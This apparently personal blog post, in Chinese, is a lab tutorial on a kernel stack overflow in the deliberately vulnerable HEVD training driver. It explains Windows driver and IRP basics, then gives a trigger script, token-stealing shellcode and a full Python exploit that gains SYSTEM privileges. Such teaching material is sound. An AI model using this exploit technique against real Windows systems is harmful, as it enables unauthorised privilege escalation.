@@ -1,0 +1,254 @@
+<!DOCTYPE html><html lang="ch" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HEVD栈溢出 | leebeecee</title><meta name="author" content="yo-lee"><meta name="copyright" content="yo-lee"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="相信你已经配好了环境, 如有疑惑欢迎私信我 建议在进行学习前先观阅&#x2F;HEVD&#x2F;Whitepaper目录下的说明文档的前几页. 大橘观–Driver驱动程序这些内容当然不是刚需, 但是如果藉此能令你对于驱动程序的运作机制有一定的了解, 我就十分满足了     在上一章节中, 我们最后一步的操作是通过vs编译出hevd.sys文件并由OsrLoader加载 那么在进行本章的内容前, 先提一下有关win">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HEVD栈溢出">
+<meta property="og:url" content="http://yoursite.com/2020/12/06/HEVD%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="leebeecee">
+<meta property="og:description" content="相信你已经配好了环境, 如有疑惑欢迎私信我 建议在进行学习前先观阅&#x2F;HEVD&#x2F;Whitepaper目录下的说明文档的前几页. 大橘观–Driver驱动程序这些内容当然不是刚需, 但是如果藉此能令你对于驱动程序的运作机制有一定的了解, 我就十分满足了     在上一章节中, 我们最后一步的操作是通过vs编译出hevd.sys文件并由OsrLoader加载 那么在进行本章的内容前, 先提一下有关win">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206104441.png">
+<meta property="article:published_time" content="2020-12-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-12-06T09:14:28.938Z">
+<meta property="article:author" content="yo-lee">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206104441.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://yoursite.com/2020/12/06/HEVD%E6%A0%88%E6%BA%A2%E5%87%BA/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-12-06 17:14:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+  }
+}
+
+var autoChangeMode = 'false'
+var t = saveToLocal.get('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (saveToLocal.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" type="text/css" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="leebeecee" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">5</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">1</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E6%A9%98%E8%A7%82%E2%80%93Driver%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">大橘观–Driver驱动程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TRY-TO-FIND"><span class="toc-number">2.</span> <span class="toc-text">TRY TO FIND</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Try-to-meet"><span class="toc-number">3.</span> <span class="toc-text">Try to meet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%87%BB%E4%BD%A0%E5%88%9A%E5%88%9A%E5%AE%8C%E6%88%90%E8%BF%99%E4%B8%80%E8%B7%B3"><span class="toc-number">4.</span> <span class="toc-text">目击你刚刚完成这一跳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%93%E5%88%AB%E6%97%B6%E6%83%B3%E8%AF%B4%E4%BA%9B%E4%BB%80%E4%B9%88"><span class="toc-number">6.</span> <span class="toc-text">道别时想说些什么</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%91%E4%BA%BA%E5%8F%AF%E8%AF%BB"><span class="toc-number">6.0.0.1.</span> <span class="toc-text">近人可读</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206104441.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">leebeecee</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">HEVD栈溢出</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-12-05T16:00:00.000Z" title="Created 2020-12-06 00:00:00">2020-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-12-06T09:14:28.938Z" title="Updated 2020-12-06 17:14:28">2020-12-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/A-TALE-OF-HEVD/">A TALE OF HEVD</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>相信你已经配好了环境, 如有疑惑欢迎私信我</p>
+<p>建议在进行学习前先观阅/HEVD/Whitepaper目录下的说明文档的前几页.</p>
+<h3 id="大橘观–Driver驱动程序"><a href="#大橘观–Driver驱动程序" class="headerlink" title="大橘观–Driver驱动程序"></a>大橘观–Driver驱动程序</h3><p><font color= 'pink'><strong>这些内容当然不是刚需, 但是如果藉此能令你对于驱动程序的运作机制有一定的了解, 我就十分满足了</strong></font></p>
+<img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206131428.jpg" alt="teamk_pixabay" style="zoom: 67%;" />
+
+
+
+<p>在上一章节中, 我们最后一步的操作是通过vs编译出hevd.sys文件并由OsrLoader加载</p>
+<p>那么在进行本章的内容前, 先提一下有关windows驱动的知识.</p>
+<p>到底什么是驱动程序</p>
+<p>描述驱动程序可以通过与<code>dll</code>程序进行比较:</p>
+<p><code>驱动程序Drive</code>与<code>动态链接库dll</code>十分相似. 他具有类似于<code>DLLMAIN</code>的主入口点, 名为<code>DriverEntry</code>.</p>
+<p>不同的是, 当驱动程序被操作系统加载时, <code>DriverEntry</code>仅被调用一次. 但是DLL不同,<code>DLLMAIN</code>被调用的次数取决于有多少应用程序或是线程在使用这个DLL文件</p>
+<p>DLL程序定义了自己的<code>interfaces</code>, 并通过<code>LIB</code>文件导出, 使得应用程序可以进行链接</p>
+<p>通过填充操作系统创建的<code>Driver_OBJECT</code>数据结构, 驱动程序在<code>DriverEntry</code>中导出一组标准的入口点.</p>
+<p>每当将请求定向到设备,  操作系统会查看此数据结构,以获取指向适当功能的指针.</p>
+<p><code>DRIVER_OBJECT</code>是操作系统分配和部分初始化的内存块, 该对象描述了:</p>
+<ol>
+<li>驱动程序代码加载到内存中的位置</li>
+<li>驱动程序的名称</li>
+<li><code>Function Address Pointer</code>, 驱动程序必须填写这些指针以指示驱动程序支持的功能. 并且必须要有一个功能指针称做<code>Function Dispatch Table</code>, 这个分配表为操作系统支持的每一个<code>Major Function Code</code>分配一个入口.  现在驱动程序可以支持28个功能, 但是我们只要记住这8个功能函数即可</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">IRP_MJ_CREATE，</span><br><span class="line"></span><br><span class="line">IRP_MJ_CLOSE，</span><br><span class="line"></span><br><span class="line">IRP_MJ_READ，</span><br><span class="line"></span><br><span class="line">IRP_MJ_WRITE，</span><br><span class="line"></span><br><span class="line">IRP_MJ_PNP，</span><br><span class="line"></span><br><span class="line">IRP_MJ_POWER，</span><br><span class="line"></span><br><span class="line">IRP_MJ_DEVICE_CONTROL</span><br><span class="line"></span><br><span class="line">IRP_MJ_SYSTEM_CONTROL</span><br></pre></td></tr></table></figure>
+
+<p>每当用户向操作系统请求执行功能时, 操作系统都会选择与该操作对应的功能函数, 并返回相应操作数给用户</p>
+<p>驱动程序创建的<code>DEVICE_OBJECTS</code>对象会描述驱动程序支持的”物理的”或”虚拟的”设备</p>
+<p>这些<code>DEVICE_OBJECT</code>是I / 0请求的目标, 并且DEVICE_OBJECT必须为这些设备创建名称, 以便用户应用程序或其他驱动程序可以<code>OPEN</code>这些设备. </p>
+<p>举个栗子:</p>
+<p>当一个用户应用程序执行CreateFile请求并指定名称<code>Com1</code>时,操作系统会对名为<code>Com1</code>的设备进行<code>open</code>操作</p>
+<p>并向应用程序返回一个<code>HANDLE</code></p>
+<p>驱动程序会处理由以用户态运行的程序发送的请求, 有时也可能会处理来自操作系统中其他驱动程序的请求. </p>
+<ul>
+<li>在用户态下:</li>
+</ul>
+<p>请求将内置到称为<code>IRP</code>的包中</p>
+<p><code>IRP</code>由<strong>I/O管理器和操作系统组件</strong>构建, 并且包含<code>Major Function Code</code>,  这段代码向驱动程序指示应该在设备上执行的操作. 构建<code>IRP</code>之后, I/0管理管理器将通过<code>DRIVER_OBJECT</code>中包含的<code>Function Dispatch Table</code>在其导出的入口点调用驱动程序.</p>
+<ul>
+<li>如果一个驱动程序向另一个驱动程序发送请求时:</li>
+</ul>
+<p>那么另一个的驱动程序负责构建<code>IRP</code>, 并使用操作系统例程将IRP传递给你的驱动程序</p>
+<p>一旦驱动程序收到IRP, 它就有3种关于如何处理这些请求的选项</p>
+<ul>
+<li>立即执行用户请求的操作, 并且立即告诉操作系统IRP已经完成</li>
+<li>保留IRP, 并告诉操作系统IRP处于<code>Pending</code>状态, 稍后进行操作</li>
+<li>驱动程序确定它本身无法处理请求, 并且必须将IRP传递给其他将处理请求的驱动程序</li>
+</ul>
+<p>如果驱动程序正在控制某个实际的物理设备, 则驱动程序负责响应对于该设备的请求</p>
+<p>通常, 这些设备在完成请求操作后, 会发生<code>中断</code>;</p>
+<p>操作系统会为驱动相关的设备注册<code>Interrupt Service Routine(ISR)</code>.</p>
+<p> 当设备在调用相关<code>ISR</code>时, 设备会发生中断. 这是因为<code>ISR</code>负责确定发生的是否是设备中断:</p>
+<ul>
+<li>如果不是设备中断, 则进行返回操作并向操作系统表明该中断未进行处理, 此时操作系统将调用下一个注册的中断管理程序</li>
+<li>如果该中断是针对该设备的, 则ISR必须保存该中断所需的<code>上下文</code>, 最后进行<code>DPC</code>队列中, <code>DPC</code>例程是内核模式回调, 它负责完成<code>IRP</code>(<code>IRP</code>的工作是通过信号中断执行的,并负责声明驱动程序的执行)</li>
+</ul>
+<h3 id="TRY-TO-FIND"><a href="#TRY-TO-FIND" class="headerlink" title="TRY TO FIND"></a>TRY TO FIND</h3><p>要大致的理解一个程序运作的流程, 自然离不开IDA</p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153052.png" alt="image-20201206153052617"></p>
+<p>找到IrpDeviceIoCtlHandler之后</p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153237.png" alt="image-20201206153237210"></p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153426.png" alt="image-20201206153426470"></p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206165633.png" alt="image-20201206165632969"></p>
+<p> 不难发现<code>switch</code>由IRP相应的数据结构所控制, switch的内容为0x22203,就可以进入栈溢出函数当中</p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153627.png" alt="image-20201206153627365"></p>
+<p>发现导致栈溢出的函数, memcpy</p>
+<p>我们进入分析栈结构</p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153719.png" alt="image-20201206153719845"></p>
+<p>使用**’A’ * 0x81C + ‘B’ * 4 + shellcodeaddr **的结构. 我们就可以完成栈溢出利用</p>
+<h3 id="Try-to-meet"><a href="#Try-to-meet" class="headerlink" title="Try to meet"></a>Try to meet</h3><p>在上个部分, 我们已经熟悉了整个驱动程序的运作流程, 以及漏洞发生的位置, 如何去利用这个漏洞. </p>
+<p>但是这些都是静态分析出来的结果, 我们的下一步工作是通过动态调试的方式定位到相应的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes, sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line"><span class="comment"># 0xC0000000 前四位为 1100,等同于GENERIC_READ | GENERIC_WRITE,即读写权限</span></span><br><span class="line"><span class="comment"># 0x3 为 0011,等同于FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,即只读和隐藏属性</span></span><br><span class="line">hevDevice = kernel32.CreateFileA(<span class="string">&quot;\\.\HackSysExtremeVulnerableDriver&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="literal">None</span>, <span class="number">0x3</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hevDevice <span class="keyword">or</span> hevDevice == <span class="number">-1</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;*** Couldn&#x27;t get Device Driver handle.&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x81c</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span> </span><br><span class="line">bufLength = len(buf)</span><br><span class="line"></span><br><span class="line">kernel32.DeviceIoControl(hevDevice, <span class="number">0x222003</span>, buf, bufLength, <span class="literal">None</span>, <span class="number">0</span>, byref(c_ulong()), <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
+
+<p>emmm, 这里有两个函数比较重要<font color= 'pink'><code>CreateFileA</code></font>以及<font color= 'pink'><code>DeviceIoControl</code></font></p>
+<p>虽然MSDN已经够了, 但是我还是推荐下这篇文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lsh123/p/6890797.html">CreateFile DeviceIoControl dwIoControlCode——应用程序与驱动程序通信</a></p>
+<p>exp比较简单, 就不过多的赘述</p>
+<p>我们运行demo.py之后</p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206160833.png" alt="image-20201206160833004"></p>
+<p>可以看到, 我们已经进入了漏洞函数, 并且之前的DbgPrint也成功的显示了函数中原本的内容</p>
+<p>那么就可以进行漏洞利用了</p>
+<h3 id="目击你刚刚完成这一跳"><a href="#目击你刚刚完成这一跳" class="headerlink" title="目击你刚刚完成这一跳"></a><font color= 'pink'>目击你刚刚完成这一跳</font></h3><p>怎么去利用, 首先想到的就是提权</p>
+<p>在Windows中所有的对象都有安全描述符, 它们定义了在对象上谁可以执行哪些行为. 有很多种<code>tokens</code>用于描述这些访问权限, 但是<code>NT AUTHORITY\SYSTEM</code> 拥有最高权限.</p>
+<p>上面提到</p>
+<p>使用<code>&#39;A&#39; * 0x81C + &#39;B&#39; * 4 + shellcodeaddr</code> 的结构. 我们就可以完成栈溢出利用(这里的’B*4没有什么必要, 只是平时的一个习惯’)</p>
+<img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206162144.jpg" alt="img" style="zoom:50%;" />
+
+<p>在HackSysTeam驱动中内置了一些<code>payload</code>, 其中一个的内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pushad                               ; Save registers state</span><br><span class="line"></span><br><span class="line">; Start of Token Stealing Stub</span><br><span class="line">xor eax, eax                         ; Set ZERO</span><br><span class="line">mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                     ; _KTHREAD is located at FS:[0x124]</span><br><span class="line"></span><br><span class="line">mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"></span><br><span class="line">mov ecx, eax                         ; Copy current process _EPROCESS structure</span><br><span class="line"></span><br><span class="line">mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4</span><br><span class="line"></span><br><span class="line">SearchSystemPID:</span><br><span class="line">    mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">    sub eax, FLINK_OFFSET</span><br><span class="line">    cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">    jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">                                     ; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">popad                                ; Restore registers state</span><br></pre></td></tr></table></figure>
+
+<p>这里我们已经完成了提权, 但是如果直接运行这段shellcode的话, 你的栈肯定会崩掉,</p>
+<p>回到IDA, 我们去分析一下</p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206163932.png" alt="image-20201206163932826"></p>
+<p>我们仍需在这之后进行如下操作以维持堆栈平衡</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS -&gt; STATUS_SUCCESS</span><br><span class="line">pop ebp</span><br><span class="line">retn 8</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>最终的exploit如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes, sys, struct</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line"><span class="comment"># 0xC0000000 前四位为 1100,等同于GENERIC_READ | GENERIC_WRITE,即读写权限</span></span><br><span class="line"><span class="comment"># 0x3 为 0011,等同于FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,即只读和隐藏属性</span></span><br><span class="line">hevDevice = kernel32.CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="literal">None</span>, <span class="number">0x3</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hevDevice <span class="keyword">or</span> hevDevice == <span class="number">-1</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;*** Couldn&#x27;t get Device Driver handle.&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += bytearray(</span><br><span class="line">    <span class="string">&quot;\x60&quot;</span></span><br><span class="line">    <span class="string">&quot;\x64\xA1\x24\x01\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x40\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x89\xC1&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x98\xF8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\x04\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x80\xB8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2D\xB8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x39\x90\xB4\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x75\xED\x8B\x90\xF8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x89\x91\xF8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x61&quot;</span></span><br><span class="line">    <span class="string">&quot;\x31\xC0&quot;</span></span><br><span class="line">    <span class="string">&quot;\x5D&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC2\x08\x00&quot;</span>             </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ptr = kernel32.VirtualAlloc(c_int(<span class="number">0</span>),c_int(len(shellcode)), c_int(<span class="number">0x3000</span>), c_int(<span class="number">0x40</span>))</span><br><span class="line">buff = (c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))</span><br><span class="line">shelladdr = struct.pack(<span class="string">&quot;&lt;L&quot;</span>, ptr)</span><br><span class="line"><span class="keyword">print</span> shelladdr</span><br><span class="line"></span><br><span class="line">buf = <span class="string">&quot;a&quot;</span> * <span class="number">2080</span> + shelladdr</span><br><span class="line">bufLength = len(buf)</span><br><span class="line"></span><br><span class="line">kernel32.DeviceIoControl(hevDevice, <span class="number">0x222003</span>, buf, bufLength, <span class="literal">None</span>, <span class="number">0</span>, byref(c_ulong()), <span class="literal">None</span>)</span><br><span class="line">Popen(<span class="string">&quot;start cmd&quot;</span>, shell = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>最终结果如下</p>
+<p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206164429.png" alt="image-20201206164429042"></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="道别时想说些什么"><a href="#道别时想说些什么" class="headerlink" title="道别时想说些什么"></a>道别时想说些什么</h3><p>复现这个漏洞的过程中, 我参阅了这些资料</p>
+<p><a target="_blank" rel="noopener" href="https://r00tk1ts.github.io/2018/01/06/%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/">Windows exploit系列教程第十部分：内核利用程序之栈溢出</a></p>
+<p><a target="_blank" rel="noopener" href="https://50u1w4y.github.io/site/HEVD/stackoverflow/">HEVD栈溢出</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.osronline.com/article.cfm%5earticle=233.html">Exactly What is A Driver</a></p>
